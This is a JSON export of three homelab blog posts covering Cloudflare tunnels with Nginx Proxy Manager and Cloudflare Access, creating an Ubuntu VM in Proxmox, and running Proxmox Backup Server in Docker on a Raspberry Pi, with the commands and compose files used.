[ { "title": "Set up Cloudflare tunnels with Nginx Proxy Manager", "url": "/posts/cloudflare-tunnels-with-npm/", "categories": "Homelab", "tags": "", "date": "2023-03-11 11:00:00 -0500", "snippet": "Recently, I learned about Cloudflare tunnels and how you can safely expose your internal services without opening any ports on your router and I was mindblown! In this post, I’ll show how to set up...", "content": "Recently, I learned about Cloudflare tunnels and how you can safely expose your internal services without opening any ports on your router and I was mindblown! In this post, I’ll show how to set up the Cloudflare tunnel, installing Docker services, using a wildcard subdomain to route all requests to NPM (Nginx Proxy Manager), and adding Google authentication to your applications.Why Cloudflare TunnelsOne of the prerequisites to this tutorial is that you need to add a site to Cloudflare that you can manage. This will include many default features such as DDoS protection, malicious bots, and you can analyze stats for traffic directed to your website. Your domain does not need to be owned by Cloudflare but in my case, it is. If you have a domain elsewhere, the only steps should be to point your domain’s nameservers to Cloudflare’s nameservers but be sure to check their documentation. Lastly, everything in this tutorial is absolutely FREE!Cloudflare tunnels are wicked because they will update your IP dynamically if it changes, encrypt all traffic, and include the above site protection features for your domain. There is a lot to it so let’s dive in.Preparing a VMIn my previous post, I documented how to create a VM in Proxmox. I will build off of that to prepare a VM that will install the cloudflared tunnel as well as NPM as a Docker container.Install PackagesFirst, we’ll run the following commands to help us out.conductor@npm:~$ sudo apt update &amp;&amp; sudo apt upgradeconductor@npm:~$ sudo apt install vim openssh-serverNext, let’s check the status of the SSH service to see if it was configured properly.conductor@npm:~$ systemctl status sshd● ssh.service - OpenBSD Secure Shell server Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: Active: active (running) since Sat 2023-03-11 13:30:10 EST; 3min 51s ago Docs: man:sshd(8) man:sshd_config(5) Main PID: 3959 (sshd) Tasks: 1 (limit: 3484) Memory: 2.6M CGroup: /system.slice/ssh.service └─3959 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startupsConfigure a static IPThe distribution I’m working with is an Ubuntu 20.04 instance which uses netplan for it’s network management. Netplan configuration files are saved in /etc/netplan and the only file I have is 01-network-manager-all.yamlconductor@npm:~$ cat /etc/netplan/01-network-manager-all.yaml# Let NetworkManager manage all devices on this systemnetwork: version: 2 renderer: NetworkManagerTo update the configuration file, first, check the name of your interface.conductor@npm:~$ ip -br alo UNKNOWN 127.0.0.1/8 ::1/128ens18 UP 192.168.0.X/24 2607:fea8:bddf:bc00::217c/128 2607:fea8:bddf:bc00:18f3:8fff:fee4:ebcd/64 fe80::18f3:8fff:fee4:ebcd/64Update the configuration file similar to the contents below replacing the interface, IP address(es), the DNS servers, and the route to your gateway.conductor@npm:~$ cat /etc/netplan/01-network-manager-all.yaml# Let NetworkManager manage all devices on this systemnetwork: version: 2 ethernets: ens18: dhcp4: false addresses: [192.168.0.X/24] nameservers: addresses: [8.8.8.8, 8.8.4.4] routes: - to: default via: 192.168.0.1Apply the netplan and check to see if the IP address was applied.conductor@npm:~$ sudo netplan applyconductor@npm:~$ ip -br alo UNKNOWN 127.0.0.1/8 ::1/128ens18 UP 192.168.0.X/24 2607:fea8:bddf:bc00::217c/128 2607:fea8:bddf:bc00:18f3:8fff:fee4:ebcd/64 fe80::18f3:8fff:fee4:ebcd/64I usually reboot to see if the IP was persistent on reboot.Install DockerDocker Repository ConfigurationThese instructions are from Docker 1 but I will summarize them here.Update the apt package index and install packages to allow apt to use a repository over HTTPS:conductor@npm:~$ sudo apt-get updateconductor@npm:~$ sudo apt-get install ca-certificates curl gnupg lsb-releaseAdd Docker’s official GPG key.conductor@npm:~$ sudo mkdir -m 0755 -p /etc/apt/keyringsconductor@npm:~$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpgSet up the repositoryconductor@npm:~$ echo \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/nullDocker Package InstallationUpdate the package index with the new repositories that were added.conductor@npm:~$ sudo apt-get updateInstall Docker Engine, containerd, and Docker Compose.conductor@npm:~$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-pluginVerify that everything is working by pulling the hello-world image which is pretty much a container that Docker maintains to ensure your Docker installation is good to go.conductor@npm:~$ sudo docker run hello-worldUnable to find image 'hello-world:latest' locallylatest: Pulling from library/hello-world2db29710123e: Pull completeDigest: sha256:6e8b6f026e0b9c419ea0fd02d3905dd0952ad1feea67543f525c73a0a790fefbStatus: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \"hello-world\" image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/get-started/The -a option will show all containers that are not running as well.conductor@npm:~$ docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES144cb948ca3a hello-world \"/hello\" 28 seconds ago Exited (0) 27 seconds ago relaxed_aryabhataClean up the container and imageconductor@npm:~$ docker rm 144cb94144cb94conductor@npm:~$ docker image rm hello-worldUntagged: hello-world:latestUntagged: hello-world@sha256:6e8b6f026e0b9c419ea0fd02d3905dd0952ad1feea67543f525c73a0a790fefbDeleted: sha256:feb5d9fea6a5e9606aa995e879d862b825965ba48de054caab5ef356dc6b3412Deleted: sha256:e07ee1baac5fae6a26f30cabfe54a36d3402f96afda318fe0a96cec4ca393359The docker rm command will accept the first few bytes of the Container ID.Finishing UpTo wrap up the Docker installation, let’s enable the Docker and containerd service so that these services will start on boot.conductor@npm:~$ sudo systemctl enable docker.serviceconductor@npm:~$ sudo systemctl enable containerd.serviceFinally, all that should be left is to be able to manage the Docker installation as a non-root user 2Create the docker grou and add your user.conductor@npm:~$ sudo groupadd dockerAdd your user to the group.conductor@npm:~$ sudo usermod -aG docker $USERActivate the changes to the groups. Otherwise, you’ll have to log out and log back in.conductor@npm:~$ newgrp dockerFeel free to pull the hello-world image to test if using the docker command without sudo works.Install CloudflaredOn Cloudflare, enter the section to manage your site. Follow the below steps to create your first tunnel: Enter the dashboard to manage your site _&gt; select Access from the lefthand tabs -&gt; Launch Zero Trust -&gt; Expand the Access tab -&gt; Tunnels Create a tunnel and provide a name for your tunnel Install the connector. During my testing, I tried Docker and although it works, there was one annoying issue with the network namespace for the Docker container so I’m going to use the Debian installer. Download the cloudflared debian package and install the service. Execute the three commands below replacing the JWT token with the one Cloudflare provided.conductor@npm:~$ curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb &amp;&amp;conductor@npm:~$ sudo dpkg -i cloudflared.deb &amp;&amp;conductor@npm:~$ sudo cloudflared service install &lt;JWT token&gt;Once this command finishes executing, status at the bottom of the page should have a “Connected” status.Install Nginx Proxy ManagerNow, let’s install Nginx Proxy Manager and use the following docker-compose file to create our Docker container.version: \"3\"services: app: image: 'jc21/nginx-proxy-manager:latest' restart: unless-stopped ports: # These ports are in format &lt;host-port&gt;:&lt;container-port&gt; - '80:80' # Public HTTP Port - '443:443' # Public HTTPS Port - '81:81' # Admin Web Port # Add any other Stream port you want to expose # - '21:21' # FTP environment: DB_MYSQL_HOST: \"db\" DB_MYSQL_PORT: 3306 DB_MYSQL_USER: \"npm\" DB_MYSQL_PASSWORD: \"npm\" DB_MYSQL_NAME: \"npm\" # Uncomment this if IPv6 is not enabled on your host # DISABLE_IPV6: 'true' volumes: - ./data:/data - ./letsencrypt:/etc/letsencrypt depends_on: - db db: image: 'jc21/mariadb-aria:latest' restart: unless-stopped environment: MYSQL_ROOT_PASSWORD: 'npm' MYSQL_DATABASE: 'npm' MYSQL_USER: 'npm' MYSQL_PASSWORD: 'npm' volumes: - ./data/mysql:/var/lib/mysqlThe above is a standard file provided from the NPM website so let’s make a few changes. First, we’re going to change up some of the paths for the volumes and use a more secure password.conductor@npm:~$ sudo mkdir -p /data/docker/{npm,mysql}conductor@npm:~$ ls -la /data/docker/total 16drwxr-xr-x 4 root root 4096 Mar 11 14:42 .drwxr-xr-x 3 root root 4096 Mar 11 14:42 ..drwxr-xr-x 2 root root 4096 Mar 11 14:42 mysqldrwxr-xr-x 2 root root 4096 Mar 11 14:42 npmOur new configuration file.version: \"3\"services: app: image: 'jc21/nginx-proxy-manager:latest' restart: unless-stopped ports: # These ports are in format &lt;host-port&gt;:&lt;container-port&gt; - '80:80' # Public HTTP Port - '443:443' # Public HTTPS Port - '81:81' # Admin Web Port # Add any other Stream port you want to expose # - '21:21' # FTP environment: DB_MYSQL_HOST: \"db\" DB_MYSQL_PORT: 3306 DB_MYSQL_USER: \"npm\" DB_MYSQL_PASSWORD: \"&lt;user password&gt;\" DB_MYSQL_NAME: \"npm\" # Uncomment this if IPv6 is not enabled on your host # DISABLE_IPV6: 'true' volumes: - /data/docker/npm/data:/data - /data/docker/npm/letsencrypt:/etc/letsencrypt depends_on: - db db: image: 'jc21/mariadb-aria:latest' restart: unless-stopped environment: MYSQL_ROOT_PASSWORD: \"&lt;root password&gt;\" MYSQL_DATABASE: 'npm' MYSQL_USER: 'npm' MYSQL_PASSWORD: \"&lt;user password&gt;\" volumes: - /data/docker/mysql/mysql:/var/lib/mysqlAfter saving the above file as docker-compose.yml, run the followingroot@npm:/data/docker# docker compose up -dAfter a few seconds, the containers should be started and we can verify that with the docker ps command.conductor@npm:/data/docker$ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9bb1dc81e49c jc21/nginx-proxy-manager:latest \"/init\" About a minute ago Up About a minute 0.0.0.0:80-81-&gt;80-81/tcp, :::80-81-&gt;80-81/tcp, 0.0.0.0:443-&gt;443/tcp, :::443-&gt;443/tcp docker-app-1fe5074aaa88c jc21/mariadb-aria:latest \"/scripts/run.sh\" About a minute ago Up About a minute 3306/tcp docker-db-1If we browse to the IP address for the server that we’ve configured on port 81 (NPM admin panel), http://”&lt; IP &gt;”:81, we should see the login form.The default credentials are admin@example.com:changeme. Once you log in, you will be prompted to change it.Cloudflare Tunnel -&gt; NPM IntegrationCreate a public hostnameThis is probably one of the most exciting moments that we can quickly test for our integration with Cloudflare Tunnel and NPM.Switch back to the dashboard where you created your tunnel and add a public hostname (you can find this under the Public Hostnames tab). Create a public hostname Subdomain: npm Select the domain which would be your domain/site that you’ve added to your Cloudflare account. Service: Type: http Url: 127.0.0.1:81 (since Cloudflared and NPM are running on the same host, we can use localhost for this but if you have configured them to run on separate devices, use the IP address of your host). Leave the rest of the options as is. Save hostname.We have gone through all of these steps just to end up at this final stage! Browse to https://npm.&lt;your-domain&gt; and you should be presented with the same login page that we saw above.It is pretty amazing that with a few steps, we were able to access our Nginx Proxy Manager dashboard from outside of our home network with TLS encryption.Self-signed Certificate ApplicationsFor any applications that are self-signed, follow the above steps but select the Service Type as https and the URL as the &lt;IP&gt;:&lt;HTTPS PORT&gt;. Under Additional Application Settings, expand the TLS tab and enable No TLS Verify. The rest of the options should be the same.If you have an application that has a Lets Encrypt cert for example, it should be fine.Wildcard Subdomain RoutingOne of the cool things that I was able to get working was wildcard subdomain routing. What we will try to accomplish here is that for any subdomains that aren’t explicitly mentioned in the Tunnel’s Public Hostname tab, we will route through the NPM instance and then based on the hostname (including subdomain), NPM will proxy the requests to the hosts that we specify.Some notes about this: I learned this the hard way but the free tier does not allow Universal TLS encryption for nested subdomains (i.e you can’t have foo.bar.&lt; domain &gt;). Only one tier of subdomains is allowed. You are able to control the order of the hostnames which I’m assuming is the resolution order so leave the wildcard routing at the bottom. This was a bit of a challenge and a problem I will tackle in the future but this wildcard routing that I configure will only work for non-TLS supported applications. For any TLS applications, create an explicit entry in the Public Hostnames page that routes to your server similar to how I mentioned above.In the public hostname page, follow the same steps as mentioned earlier when we were creating the npm subdomain to create a wildcard subdomain entry. The only differences are that for the subdomain use * and the URL will stay as the IP for your NPM server and the port should now be 80 instead of 81. Port 81 is used for NPM administration whereas port 80 and 443 is where the proxying is enabled.There is still one more crucial step for this to work. Head to the Overview tab for your tunnel and copy the tunnel ID. It should be a long alphanumeric string separated with dashes. Exit out of the Zero Trust dashboard and click on the DNS tab for your site/domain’s section.Create a CNAME DNS record with * as the Name and the Content is &lt;tunnel id&gt;.cfargotunnel.com and leave the Proxy status as Proxied and not DNS only. We should be all set to enable wildcard routing through our NPM instance.Create an NPM Proxy HostIf you followed this tutorial, you should have two subdomains in your Public Hostnames section for your Cloudflare tunnel. One is for npm and the other is for * (wildcard). Let’s delete the npm entry and actually enable this in our Nginx Proxy Manager dashboard as a Proxy Host. If this sounds confusing, I will document the steps and explain along the way.First, head to the NPM admin panel through your local IP address and not through the npm subdomain since we just deleted it, and Add a Proxy Host.For the settings, Domain names: npm.&lt;domain&gt; Scheme: http Forward Hostname/IP: 127.0.0.1 Forward Port: 81 Select Block Common ExploitsLeave the rest of the settings as is.What we are saying here is that if the NPM receives a request for a host with the npm subdomain on port 80, proxy the request to the same NPM instance but on port 81. This process should work perfectly since we configured Cloudflare tunnels to route all wildcard requests to the NPM server on port 80. Now, we can perform the same request as before to https://npm.&lt;domain&gt; and be redirected to our NPM admin page.Additional NPM Proxy HostsPortainerTo demonstrate this point further, let’s install Portainer as an application as well. Portainer is a Docker image that will provide an administrative panel to manage all of your Docker instances locally or connect to Portainer agents and manage those Docker instances as well. If you don’t have another server, feel free to install it locally on the same Docker instance as your NPM/Cloudflared server, but keep in mind that the IP addresses and details might differ slightly.I saved the following Docker compose file as portainer-docker-compose.yml. Make changes as you see necessary.version: \"3\"services: portainer: image: portainer/portainer-ce:latest container_name: portainer restart: unless-stopped security_opt: - no-new-privileges:true volumes: - /etc/localtime:/etc/localtime:ro - /var/run/docker.sock:/var/run/docker.sock - /data/docker/portainer:/data ports: - 9000:9000Run the following command:conductor@docker:~$ docker compose -f portainer-docker-compose.yml up -dBrowse to http://&lt;ip&gt;:9000 and Portainer should prompt you to create an account. Once you create an account, select the local tab on the left, and you can view the containers running on this Docker instance. If you have more than just portainer running, you’ll see all of your containers.Next, let’s create another NPM Proxy Host in the NPM dashboard with the following settings.For the settings, Domain names: portainer.&lt;domain&gt; Scheme: http Forward Hostname/IP: &lt;IP&gt; Forward Port: 9000 Select Block Common ExploitsLeave the rest of the settings as is. Now, if you browse to portainer.&lt;domain&gt;, you can finally access your application outside of your local environment!VS Code ServerEven for fun, let’s download the VS Code Server Docker container which renders VS code in the browser!Let’s copy the sample docker-compose file from https://hub.docker.com/r/linuxserver/code-server and modify the settings a bit.version: \"2.1\"services: code-server: image: lscr.io/linuxserver/code-server:latest container_name: code-server environment: - PUID=1000 - PGID=1000 - TZ=Etc/UTC - PASSWORD=&lt;password&gt; - SUDO_PASSWORD=&lt;sudo password&gt; - DEFAULT_WORKSPACE=/config/workspace volumes: - /data/docker/vscode/config:/config ports: - 8443:8443 restart: unless-stoppedSame as before, I saved this as vs-code-docker-compose.yml and ran the docker compose command.conductor@docker:~$ docker compose -f vs-code-docker-compose.yml up -dOnce the Docker container has finished, we should be able to view it by browsing to http://&lt;IP&gt;:8443 and entering our password that we specified in the PASSWORD environment variable in the docker compose file.Next, the container should appear in portainer as well where we can manage any changes from there.All that’s left is to add another proxy host to the NPM instance that routes the vscode subdomain to the VS Code Server on port 8443. The only addition when adding this proxy host is to Enable Websockets Support and that should be it.It is pretty awesome that we were able to set this up with such little effort. Feel free to keep adding subdomains through the tunnel page or through NPM. For now, I will be adding proxy hosts in the NPM home page as long as they don’t have TLS enabled and then for any TLS applications, those will be explicit entries through the Tunnels dashboard.NPM 404 Not FoundSince all of our requests that don’t match explicit subdomains from the tunnels specification are going through NPM, we should specify a 404 page. The default is that NPM will display a congratulations page.Under the settings tab, edit the Default Site setting and create a Custom Page with the following HTML.&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;/hr&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;&lt;!-- a padding to disable MSIE and Chrome friendly error page --&gt;Now, if we browse to fake.&lt;domain&gt;, we should presented with just a 404 Not Found page with no details about what type of NGINX server it is. The default 404 page includes the version of NGINX and returns an HTTP status code of 404. I’m sure that Cloudflare has some safeguards against attacks but let’s keep our attackers on their toes.Cloudflare AccessLastly, Cloudflare Access has a versatile range of authentication methods that you can place in front of any of your applications. This can be configured with include policies, exclude policies, with a diverse number of methods to specify selectors such as emails, IP ranges, domains, etc. It is possible to apply this to a wildcard subdomain if you want to block absolutely everything but I will apply this per subdomain application since I might want to expose some for hosting my own blog, etc.Google Identity Provider IntegrationFollow the steps here 3 to enable Google authentication with Cloudflare Access.Cloudflare Access GroupOnce the above is configured, select Access Groups under the Access dropdown. I am going to create an Access Group to enable my personal emails using Google authentication. Specify a Group name. Check off Default Group For the Include policy Selector: Emails Value: You can include multiple emails, just press enter between each one. Save.Couldflare Access ApplicationLet’s create our first Access Application. Head to Applications under the Access dropdown. Select Self-Hosted. Specify an Application name Update the Session Duration to what you’re comfortable with. This will invalidate after the amount of time and reprompt you for the Google authentication method. Specify the application subdomain (use a wildcard if you want to apply this to every application) and the domain Under Identity providers, I unchecked Accept all and selected Google. Click Next. Provide a policy name. Leave the rest of the options as default and proceed to the next page. Same here. Leave the rest of the options as default and Add application.In an incognito browser, browse to one of the subdomains that match the application you created.You’ll be presented with a Cloudflare access page and a button that will direct you to use Google’s authentication methods. If you use an email that doesn’t match the emails in the Access Group include policy you created, then you’ll be denied access.If you successfully authenticate with a matching email, you will be allowed access! And there we have it. That wasn’t as complicated as we thought and it is pretty amazing how seamlessly everything works.One thing to note is that once you’re authenticated through Google, this session will persist across multiple applications.ConclusionThe Cloudflare Zero Trust service is impressive and I have only scratched the surface of what’s possible. It doesn’t support just HTTP and HTTPS applications, it can also render SSH, RDP, and support arbitrary TCP protocols. Lastly, it can even render SSH and VNC applications in the browser. In future posts, I will document those as well but I think we’ve covered enough here.References https://docs.docker.com/engine/install/ubuntu/ &#8617; https://docs.docker.com/engine/install/linux-postinstall/ &#8617; https://developers.cloudflare.com/cloudflare-one/identity/idp-integration/google/ &#8617; " }, { "title": "Creating my first Linux VM in Proxmox", "url": "/posts/create-vm-proxmox/", "categories": "Homelab", "tags": "", "date": "2023-03-01 14:00:00 -0500", "snippet": "It’s been a few months since I have worked on my home lab but after learning about Cloudflare Tunnels, it has reinvigorated the youth in me to tackle this problem again. Over the next couple of blo...", "content": "It’s been a few months since I have worked on my home lab but after learning about Cloudflare Tunnels, it has reinvigorated the youth in me to tackle this problem again. Over the next couple of blog posts, I will document my findings about this technology the best that I can.The one caveat being which I mentioned I would do in a previous post is to document how to install Proxmox on baremetal hardware which I don’t think I will do anymore. There are several fantastic resources out there such as this and this. It’s mentioned in the second article but I’ll mention it here as well. You must also confirm that the machine you’re using supports virtualization and that it’s enabled in the BIOS.IntroductionThis post will cover creating our first Linux VM in Proxmox VE 7 and perform some basic configuration. I will cover creating a Windows VM in a future post. Now, browse to your Proxmox instance from the browser and let’s get started.Downloading your first ISOExpand the tab on the left-hand side and the default space to save ISOs should be local. Click local, then select ISO images, and there should be two buttons. If you have the ISO saved on your system, you can upload it to Proxmox. Alternatively, Proxmox will accept a URL that it will download from. Select Download from URL, enter the URL, click Query URL, and then Download. A task modal will appear with the status of the download.I have a couple of ISOs already so I’ll use the lightweight Ubuntu 22.04 Desktop image to create my first VM.Creating the VMIn the top ribbon of the Proxmox GUI, there’s a bright blue button that says Create VM. Select that button!Select the node, VM ID, and the name of the VM (just a way to represent it in Proxmox) and proceed to the OS options.Select the ISO image that you downloaded from the local storage option.Keep the default options on the System tab.For Disks, select the volume associated with the Storage and the Disk size. For me, this is the default local-lvm and 32GB.For the CPU, increase the Cores from 1 to 2 but this option may vary depending on your hardware.Increase the memory to the amount that you’d like to set it to. I left mine at 2048MB but keep in mind that all of the above options can be modified after the VM creation step.Below are the configured options for my hardware.If you’re content with the options, click on the VM ID from the left-hand size, start the VM, and open the console tab.Installing the OSDepending on the ISO that you select, you may be prompted to install the OS to disk with a really rustic menu options that makes it seem like you don’t live in the 21st century. The ISO that I chose actually presents me with a graphical interface with a button on the desktop to install the OS.Each OS varies but for Ubuntu based systems, the options are typically: Select your location. The default keyboard language to use. Installing the OS on the attached disk (I always select Erase disk since Proxmox handles only allocating the portion that we assigned in the previous section). Creating your user and password. Summary Finally, install!In the image below, the OS installation does take a bit of time so grab a coffee or something and hang back.Once the OS has completed installation, the system may prompt you to reboot or reboot on its own but you will need to remove the ISO from the CD/DVD drive. Depending on how the bootloader is configured, it may boot from the ISO installation media before it boots from disk so let’s take care of that.ConclusionOnce you remove the installation media, log into your account and now you should have a Linux VM configured and ready to go!" }, { "title": "Proxmox Backup Server on Raspberry Pi", "url": "/posts/pbs-rpi/", "categories": "Homelab", "tags": "", "date": "2022-11-13 13:00:00 -0500", "snippet": "This is my second post in a series of blog posts (in no particular order) to build my homelab. These posts and this homelab will be a living being connected to myself. As I grow and learn more abou...", "content": "This is my second post in a series of blog posts (in no particular order) to build my homelab. These posts and this homelab will be a living being connected to myself. As I grow and learn more about system administration and networking, so will the homelab.Today’s post will document how to deploy Proxmox Backup Server as a Docker container on the Raspberry Pi. If you haven’t seen my previous post on configuring the Raspberry Pi, check that out first. This post assumes that your setup has Docker enabled along with an externally attached storage device.Proxmox Backup ServerProxmox Backup Server (PBS) is an enterprise backup solution for backing up and restoring VMs, containers, and physical hosts 1. Through the process of decomissioning my old Proxmox server, I wanted to back up the VMs before setting up the new server where I can then restore them.In this post, I will also demonstrate how to restore a VM from the PBS to a Proxmox server but I will document the process of building a Proxmox server from scratch in a future post.Docker ContainerPBS was not originally designed to run on ARM architecture but a brilliant developer created a Docker container that bypasses this limitation and pushed it to GitHub. Only a few changes are needed to be made to make this work on our system.Your Pi OS must be 64-bit for this to work.Clone the repository from https://github.com/ayufan/pve-backup-server-dockerfiles to pull the necessary files to build from scratch.I switched into the root user to save the directory in /opt.robinder@pi:/opt $ sudo suroot@pi:/opt# git clone https://github.com/ayufan/pve-backup-server-dockerfiles.git pbsCloning into 'pbs'...remote: Enumerating objects: 541, done.remote: Compressing objects: 100% (29/29), done.remote: Total 541 (delta 29), reused 40 (delta 25), pack-reused 487Receiving objects: 100% (541/541), 100.97 KiB | 1.05 MiB/s, done.Resolving deltas: 100% (303/303), done.root@pi:/opt# ls -l pbstotal 52drwxr-xr-x 2 root root 4096 Nov 11 21:54 dev-scripts-rw-r--r-- 1 root root 469 Nov 11 21:54 docker-compose.yml-rw-r--r-- 1 root root 2661 Nov 11 21:54 Dockerfile-rw-r--r-- 1 root root 1112 Nov 11 21:54 Dockerfile.client-rw-r--r-- 1 root root 4465 Nov 11 21:54 Makefiledrwxr-xr-x 2 root root 4096 Nov 11 21:54 pbs-rw-r--r-- 1 root root 5026 Nov 11 21:54 README.md-rw-r--r-- 1 root root 154 Nov 11 21:54 RELEASE.mddrwxr-xr-x 4 root root 4096 Nov 11 21:54 runitdrwxr-xr-x 3 root root 4096 Nov 11 21:54 scriptsdrwxr-xr-x 11 root root 4096 Nov 11 21:54 versionsViewing the contents of the docker-compose.yml fileroot@pi:/opt/pbs# cat docker-compose.ymlversion: '2.1'services: pbs: image: ayufan/proxmox-backup-server:latest network_mode: host mem_limit: 2G volumes: - pbs_etc:/etc/proxmox-backup - pbs_logs:/var/log/proxmox-backup - pbs_lib:/var/lib/proxmox-backup tmpfs: - /run cap_add: # smartctl support - SYS_RAWIO devices: - /dev/sda - /dev/sdb restart: unless-stopped stop_signal: SIGHUPvolumes: pbs_etc: pbs_logs: pbs_lib:A few changes are going to be made to this docker-compose file. First, changing the restart option to be always so that even if I manually stop the daemon, the container will restart. Second, I will use the volumes from my mounted storaged device so that the backups and proxmox related files are written to that device.Outputting the contents of the updated docker-compose filerobinder@pi:~/Documents/pve-backup-server-dockerfiles $ cat docker-compose.ymlversion: '2.1'services: pbs: image: ayufan/proxmox-backup-server:latest network_mode: host mem_limit: 2G volumes: - pbs_etc:/etc/proxmox-backup - pbs_logs:/var/log/proxmox-backup - pbs_lib:/var/lib/proxmox-backup - pbs_backups:/backups tmpfs: - /run cap_add: # smartctl support - SYS_RAWIO devices: - /dev/sda restart: unless-stopped stop_signal: SIGHUPvolumes: pbs_etc: driver: local driver_opts: type: '' o: bind device: /mnt/externalhdd/pbs/etc pbs_logs: driver: local driver_opts: type: '' o: bind device: /mnt/externalhdd/pbs/logs pbs_lib: driver: local driver_opts: type: '' o: bind device: /mnt/externalhdd/pbs/lib pbs_backups: driver: local driver_opts: type: '' o: bind device: /mnt/externalhdd/pbs/backupsThis Docker container mounts four directories to the host filesystem in the current directory. I specified four volumes at the bottom of the docker-compose that are referenced in the pbs service section.volumes: - pbs_etc:/etc/proxmox-backup - pbs_logs:/var/log/proxmox-backup - pbs_lib:/var/lib/proxmox-backup - pbs_backups:/backupsEach entry in the volumes section specifies a volume and the directory that it is mapped to in the Docker container. In the volume section,volumes: pbs_etc: driver: local driver_opts: type: '' o: bind device: /mnt/externalhdd/pbs/etcI specify the volume name and the location on the host filesystem.The advantage is that the data will persist between reboots and container rebuilds. If the Pi were to be wiped for any reason, a rebuild of the Pi with the same docker-compose setup will not result in any lost data related to the VM backups.With the docker-compose file modified to your use case, execute the docker compose up command.root@pi:/opt/pbs# docker compose up -d[+] Running 6/6 ⠿ pbs Pulled 67.2s ⠿ 39ab78bc09e7 Pull complete 32.2s ⠿ a9c48d67eda0 Pull complete 36.3s ⠿ 61430e9fe25f Pull complete 64.9s ⠿ 462338cc4307 Pull complete 65.1s ⠿ b7127d934af2 Pull complete 65.3s[+] Running 5/5 ⠿ Volume \"pbs_pbs_logs\" Created 0.0s ⠿ Volume \"pbs_pbs_lib\" Created 0.0s ⠿ Volume \"pbs_pbs_backups\" Created 0.0s ⠿ Volume \"pbs_pbs_etc\" Created 0.0s ⠿ Container pbs-pbs-1 StartedChecking the status of the containerroot@pi:/opt/pbs# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe64b1eac6030 ayufan/proxmox-backup-server:latest \"runsvdir /runit\" 10 seconds ago Up 3 seconds pbs-pbs-1View the netstat output to view all listening ports related to the proxmox-backup docker containerroot@pi:/opt/pbs# ss -tulnp | grep proxmox-backupudp UNCONN 0 0 127.0.0.1:40336 0.0.0.0:* users:((\"proxmox-backup-\",pid=1899,fd=13))udp UNCONN 0 0 127.0.0.1:44442 0.0.0.0:* users:((\"proxmox-backup-\",pid=1898,fd=13))tcp LISTEN 0 1024 127.0.0.1:82 0.0.0.0:* users:((\"proxmox-backup-\",pid=1898,fd=18),(\"proxmox-backup-\",pid=1898,fd=17))tcp LISTEN 0 1024 *:8007 *:* users:((\"proxmox-backup-\",pid=1899,fd=20),(\"proxmox-backup-\",pid=1899,fd=19))The docker-compose file specified host networking which exposes all listening services at the host level without requiring us so specify a host to container port mapping.The UI for PBS is listening on port 8007 on all interfaces. Browse to https://&lt;pi ip&gt;:8007. Accept the self-signed certificate warning.When prompted with the authentication form, use the credentials admin:pbspbs.These are the credentials that the creator of the Docker container configured as part of their build. Because PBS is running inside of a container, the PAM authentication realm of the Pi will not be the same as the one of the container. Our user for the Pi does not exist in the container.Now, your PBS instance is up and running! The next section is only valid if you have a PVE node which I will document in a future post.Connect PBS to PVETo add the PBS as a storage option for your VM’s on the PVE, we need to take note of the fingerprint of the Backup Server. This is required to connect a Proxmox Virtual Environment instance to the Backup Server for validation purposes.On the Dashboard section of the main PBS menu, click on the Show Fingerprint button. Copy the fingerprint and save it.Switch to the PVE node and select the Storage option under the Datacenter section.Datacenter -&gt; Storage -&gt; Add -&gt; Proxmox Backup Server ID: identifier for the pbs instance Server: IP address or hostname of the pbs Username: username@realm for the pbs user (if you followed the above tutorial, this is admin@pbs) Password: password for the user Fingerprint: fingerprint for the pbs Datastore: name of the datastore containing the backups (if you look at the PBS menu, there is a section under Datastore that displays the name of all datastores which in our case should be just one called backups)My menu with the filled in fields. Click Add and you should see the PBS instance under the storage list.Restoring a VMContinuing to work on the PVE node, click on Datacenter -&gt; pve -&gt; pbs-rpi (this is the ID you specified for the PBS instance when connecting to PVE) -&gt; Backups, we can see the VM’s and snapshots. From my previous Proxmox server, I backed up three VM’s which unfortunately did not save the names of the VM’s, only the ID’s.To restore a VM, click on one of the saved snapshots (vm102 in this case) and restore it.You are able to specify a few options such as the VM ID and storage option. Click Restore and a popup regarding the task status will appear. This will take a while so just hang back.Once completed, I tried to start the VM but Proxmox complained that the CD/DVD attached file does not exist. When I built the VM, I never detached the ISO so Proxmox is killing the process as it is not able to find the file.We can safely remove the CD/DVD Drive ISO and start the VM without fail!ConclusionSafely backing up your VM’s on a regular schedule to PBS is a convenient way to manage snapshots and instances across a single PVE node or even multiple. Backup them up to a Raspberry Pi is even more ideal as an incredibly portable device.This blog post assumed that you have a Proxmox instance to connect and restore a VM. In future post(s), I will cover how to: Build a Proxmox server Disable the Enterprise Edition Build a VM on the PVE node Configure the VM to start on boot Enable a backup schedule for the VMand more.References 